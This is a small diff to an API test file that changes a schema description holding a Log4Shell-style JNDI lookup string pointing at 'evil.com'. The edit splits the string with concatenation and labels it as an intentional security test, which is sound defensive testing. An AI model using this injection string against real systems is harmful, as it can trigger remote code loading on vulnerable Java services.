@@ -1221,7 +1221,7 @@ describe('Registry Blocks API - POST /api/registry/blocks', () => {
                 properties: {
                   data: {
                     type: 'string',
-                    description: '${jndi:ldap://evil.com}',
+                    description: '$' + '{jndi:ldap://evil.com}', // Intentional security test string
                   },
                 },
               },
